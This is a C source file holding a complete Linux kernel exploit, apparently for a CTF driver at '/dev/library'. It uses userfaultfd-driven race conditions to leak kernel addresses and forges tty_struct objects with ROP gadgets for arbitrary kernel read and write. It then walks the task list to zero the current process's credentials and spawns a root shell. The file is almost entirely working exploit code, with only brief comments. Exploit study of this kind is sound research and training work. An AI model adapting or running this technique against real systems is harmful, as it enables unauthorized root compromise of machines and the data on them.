// arb read and write to overwrite task_struct
// we need 3 requirements: 
// _ leak kernel address
// _ a stable abr read
// _ a stable abr write
// => find and replace current task_struct of our exploit process to root permission
#define _GNU_SOURCE
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <fcntl.h>
#include <poll.h>
#include <pthread.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <linux/userfaultfd.h>
#include "utils.h"

#define DEVICE_PATH "/dev/library"
#define BOOK_DESCRIPTION_SIZE 0x300
#define CMD_ADD			0x3000
#define CMD_REMOVE		0x3001
#define CMD_REMOVE_ALL	0x3002
#define CMD_ADD_DESC	0x3003
#define CMD_GET_DESC 	0x3004
#define PAGE_SIZE 0x1000
#define PAGE_FAULT_ADDR 0xdead000
typedef unsigned long ulong;

void save_state(void);
int open_dev(void);
int add_book(int);
int remove_book(int);
int remove_all(void);
int add_desc(int, char*);
int get_desc(int, char*);
void *page_fault_handler(void *);
int initialize_ufd();
int userfaultfd(int);
void abr_write(ulong, ulong);
ulong abr_read(ulong);
void get_shell();
void find_and_overwrite_task_struct(void);

typedef struct 
{
	unsigned long index;
	char *userland_pointer;     // __user denoting that address is in userspace
} request;

struct Book {
	char book_description[BOOK_DESCRIPTION_SIZE];
	unsigned long index;
	struct Book* next;
	struct Book* prev;
} *root;

int library_fd, ptmx_read_fd, ptmx_write_fd;
ulong kernel_base, kernel_heap;
ulong user_cs, user_ss, user_sp, user_rflags;
ulong userfault_page;
ulong tty_struct, leaks_7;
ulong mov_rax_ptr_rdx = 0x17538d; // mov rax, qword ptr [rdx] ; ret
ulong mov_ptr_rdx_esi = 0x13e9b1; // mov dword ptr [rdx], esi ; ret
int stage = 0; 
pthread_t tid;
ulong *leaks, *p;

int main() 
{   
    int ufd;
    // save_state();
    library_fd = open_dev();

    // state 1: race condition with remove_all() and get_desc() to leak kernel address
    add_book(0);
    ufd = initialize_ufd();
    printf("userfault fd stage 1: %d\n", ufd);
    pthread_create(&tid, NULL, page_fault_handler, &ufd);  // prepare thread for handle pagefault, page_fault_handler in stage 1 will call remove_all()
    get_desc(0, userfault_page);    // in get_desc, kernel will access userfault_page -> trigger userfaultfd
    leaks = userfault_page;

    kernel_base = leaks[0x210/8] - 0x14fc00;
    kernel_heap = leaks[0x38/8] - 0x38;
    leaks_7 = leaks[7];
    tty_struct = ((leaks[7] >> 8) << 8)+0x800;
    printf("tty_struct: %lx\n", tty_struct);
    printf("leaks_7: %lx\n", leaks_7);
                
    mov_rax_ptr_rdx += kernel_base;
    mov_ptr_rdx_esi += kernel_base;
    printf("kernel base: %p\n", kernel_base);
    printf("kernel heap: %p\n", kernel_heap);
    printf("mov_rax_ptr_rdx: %p\n", mov_rax_ptr_rdx);
    printf("mov_ptr_rdx_esi: %p\n", mov_ptr_rdx_esi);
    puts("========== done stage 1 ===========");
    pthread_join(tid, NULL);

    // module .bss: 0xffffffffc0002400
    // stage 2: race condition with remove_all() and add_desc() to setup a stable arbitrary read
    add_book(0);
    ufd = initialize_ufd();
    printf("userfault fd stage 2: %d\n", ufd);
    pthread_create(&tid, NULL, page_fault_handler, &ufd); // prepare thread for handle pagefault, page_fault_handler in stage 2 will call remove_all() and copy fake tty struct to ptmx_read_fd
    add_desc(0, userfault_page); // in add_desc, kernel will access userfault_page -> trigger userfaultfd
    puts("========== done stage 2 ==========");
    getchar();

    pthread_join(tid, NULL);

    // stage 3: race condition with remove_all() and add_desc() to setup a stable arbitrary write
    add_book(0);
    ufd = initialize_ufd();
    printf("userfault fd stage 3: %d\n", ufd);
    pthread_create(&tid, NULL, page_fault_handler, &ufd); // prepare thread for handle pagefault, page_fault_handler in stage 2 will call remove_all() and copy fake tty struct to ptmx_read_fd
    add_desc(0, userfault_page); // in add_desc, kernel will access userfault_page -> trigger userfaultfd
    puts("========== done stage 3 ==========");
    getchar();
    // race end here
    pthread_join(tid, NULL);

    puts("[*] We now statisfy all the requirements => time to get root");
    find_and_overwrite_task_struct();
    get_shell();
}

int initialize_ufd() 
{
    int fd;

    puts("[*] Mmapping page with 0x4000 size...");
    userfault_page = mmap((void *)PAGE_FAULT_ADDR, 0x4000, PROT_READ|PROT_WRITE, MAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE, -1, 0);


    if ((fd = userfaultfd(O_CLOEXEC|O_NONBLOCK)) == -1)
    {
        perror("[ERROR] Userfaultfd failed");
        exit(-1);
    }

    struct uffdio_api api = { 
        .api = UFFD_API,
        .features = 0
        };

    if (ioctl(fd, UFFDIO_API, &api))
    {
        perror("[ERROR] ioctl - UFFDIO_API failed");
        exit(-1);
    }

    if (api.api != UFFD_API)
    {
        puts("[ERROR] Unexepcted UFFD api version!");
        exit(-1);
    }

    struct uffdio_register reg = {
        .mode = UFFDIO_REGISTER_MODE_MISSING,
        .range = {
            .start = (long) (userfault_page),
            .len = 0x4000,
        }
    };

    if (ioctl(fd, UFFDIO_REGISTER,  &reg))
    {
            perror("[ERROR] ioctl - UFFDIO_REGISTER failed");
            exit(-1);
    }
    
    return fd;

}

void *page_fault_handler(void *_ufd)
{
    struct pollfd pollfd;
    struct uffd_msg fault_msg;
    // struct uffdio_copy ufd_copy;

    int ufd = *((int *) _ufd);

    pollfd.fd = ufd;
    pollfd.events = POLLIN;

    while (poll(&pollfd, 1, -1) > 0)
    {

        if ((pollfd.revents & POLLERR) || (pollfd.revents & POLLHUP))
        {
            perror("[ERROR] Polling failed");
            exit(-1);
        }

        if (read(ufd, &fault_msg, sizeof(fault_msg)) != sizeof(fault_msg))
        {
            perror("[ERROR] Read - fault_msg failed");
            exit(-1);
        }

        char *page_fault_location = (char *)fault_msg.arg.pagefault.address;

        if (fault_msg.event != UFFD_EVENT_PAGEFAULT || (page_fault_location != userfault_page && page_fault_location != userfault_page + PAGE_SIZE))
        {
            perror("[ERROR] Unexpected pagefault?");
            exit(-1);
        }


        if (page_fault_location == (void *)0xdead000)
        {
            puts("Alright, we triggered our pagefault");
            printf("[+] Page fault at address %p!\n", page_fault_location);

            // leak kernel address 
            if (stage == 0) 
            {
                getchar();
                printf("[*] stage %d\n", stage+1);
                puts("[*] Leaking address");
                remove_all();
                // create a tty_struct
                open("/dev/ptmx", O_RDWR | O_NOCTTY);
                getchar();

            } else if (stage == 1)
            {   
                printf("[*] stage %d\n", stage+1);
                puts("[*] Setup stable arbitrary read");

                remove_all();
                ptmx_read_fd = open("/dev/ptmx", O_RDWR| O_NOCTTY);
                // 0xffff8880003fa800
                p = (ulong *) malloc(0x4000);
                // ulong tty_struct = (leaks[7] >> 8) << 8; // get current address of tty_struct
                p[0] = 0x0000000100005401; // fake magic
                // p[2] = leaks[7];
                p[2] = leaks_7;
                p[3] = tty_struct + 0x2f0 - 0x60; // gadget mov rax, qword ptr [rdx] ; ret
                // store gadget mov rax, qword ptr [rdx]; ret
				p[0x2f0/8] = mov_rax_ptr_rdx; //0xffffffff8117538d;
                p[0x2f8/8] = mov_ptr_rdx_esi; //0xffffffff8113e9b1;
				printf("tty_struct: %lx\n", tty_struct);
				printf("leaks_7: %lx\n", leaks_7);
                
                struct uffdio_copy ufd_copy;
                ufd_copy.src = p;
                ufd_copy.dst = (ulong)fault_msg.arg.pagefault.address;
				ufd_copy.len = 0x4000;
                ufd_copy.mode = 0;
                ufd_copy.copy = 0;

                int aaa;
                if (aaa = ioctl(ufd, UFFDIO_COPY, &ufd_copy) < 0)
                {
                    puts("[!] ioctl(UFFDIO_COPY) error!");
                    exit(-1);
                }
                printf("waaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa: %d\n", aaa);

            } else if (stage == 2) 
            {
                printf("[*] stage %d\n", stage+1);
                puts("[*] Setup stable arbitrary write");
                getchar();
                
                remove_all();
                getchar();
                
                ptmx_write_fd = open("/dev/ptmx", O_RDWR| O_NOCTTY);
                // p = (ulong *) malloc(0x4000);
                // ulong tty_struct = (leaks[7] >> 8) << 8; // get current address of tty_struct
                p[3] = tty_struct + 0x2f8 - 0x60; // gadget mov rax, qword ptr [rdx] ; ret
                // store gadget mov rax, qword ptr [rdx]; ret
                // p[0x2f8/8] = mov_ptr_rdx_esi;
                struct uffdio_copy ufd_copy;
                ufd_copy.src = p;
                ufd_copy.dst = (ulong)fault_msg.arg.pagefault.address;
				ufd_copy.len = 0x4000;
                ufd_copy.mode = 0;
                ufd_copy.copy = 0;

                if (ioctl(ufd, UFFDIO_COPY, &ufd_copy) < 0)
                {
                    puts("[!] ioctl(UFFDIO_COPY) error!");
                    exit(-1);
                }
            }

            stage++;
        }

        // unblock userfaultfd
        struct uffdio_register uffdio_register;
        uffdio_register.range.start = fault_msg.arg.pagefault.address;
        uffdio_register.range.len = 0x4000;
        uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;

        ioctl(ufd, UFFDIO_UNREGISTER, &uffdio_register.range);
        return;
    }

    return;
}

void save_state(void) 
{
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
    printf("[*] Saved state\n");
}

int open_dev(void) 
{
    int fd = open(DEVICE_PATH, O_RDWR);
    if (fd < 0) {
        puts("[!] Error when open device!");
        exit(-1);
    } else {
        puts("[*] Opened device!");
    }

    return fd;
}

int remove_all(void) 
{
    puts("[*] calling remove_all()");
    request req = {
        .index = -1,
        .userland_pointer = NULL,
    };

    return ioctl(library_fd, CMD_REMOVE_ALL, &req);
}

int add_book(int index) 
{
    printf("[*] calling add_book(%d)\n", index);
    request req = {
        .index = index,
        .userland_pointer = NULL,
    };

    return ioctl(library_fd, CMD_ADD, &req);
}

int remove_book(int index) 
{
    printf("[*] calling remove_book(%d)\n", index);
    request req = {
        .index = index,
        .userland_pointer = NULL,
    };

    return ioctl(library_fd, CMD_REMOVE, &req);
}

int add_desc(int index, char *src) 
{
    printf("[*] calling add_desc(%d, %p)\n", index, src);
    request req;
    req.index = index;
    req.userland_pointer = src;

    return ioctl(library_fd, CMD_ADD_DESC, &req);
}

int get_desc(int index, char *dest) 
{
    printf("[*] calling get_desc(%d, %p)\n", index, dest);
    request req;
    req.index = index;
    req.userland_pointer = dest;

    return ioctl(library_fd, CMD_GET_DESC, &req);
}

int userfaultfd(int flags)
{
	return syscall(SYS_userfaultfd, flags);
}

// because the second arguments (RSI) is unsigned int, we can only write the lower 4 bytes
void abr_write(ulong addr, ulong value)
{
    ioctl(ptmx_write_fd, value & 0xffffffff, addr);
    ioctl(ptmx_write_fd, value >> 32, addr + 0x4);
}

// because the return value of `ioctl` is int, we can only read the lower 4 bytes of RAX
ulong abr_read(ulong addr)
{
    ulong lower = ioctl(ptmx_read_fd, 0, addr);
    ulong higher = ioctl(ptmx_read_fd, 0, addr + 0x4);
    return (higher << 32 ) | lower;
}

void find_and_overwrite_task_struct(void)
{
    getchar();
    // abr_read(kernel_base);
    ulong init_task = kernel_base + 0x8224c0;
    ulong pid_offset = 0x278;
    ulong next = 0x1d0;
    ulong pid = getpid();
    ulong init_task_pid, list_head;

    printf("current pid %ld\n", pid);

    while (1) {
        puts("AA");
        init_task_pid = abr_read(init_task + pid_offset) & 0xffffffff;
		list_head = abr_read(init_task + next);
        printf("list_head: %lx\n", list_head);
		if(init_task_pid == pid)	
            break;
		init_task = abr_read(list_head) - next;
        puts("AA");
		
        printf("PID: %ld task_struct :%p.\n", init_task_pid, init_task);
    }
    unsigned long cred = abr_read(init_task + 0x3c0);
	printf("cred struct : %p\n", cred);
	abr_write(cred+4,     0);
	abr_write(cred+4+8,   0);
	abr_write(cred+4+8*2, 0);
	abr_write(cred+4+8*3, 0);
}

void get_shell() {
    char *argv[] = {"/bin/sh", NULL};
    execve(argv[0], argv, NULL);

}
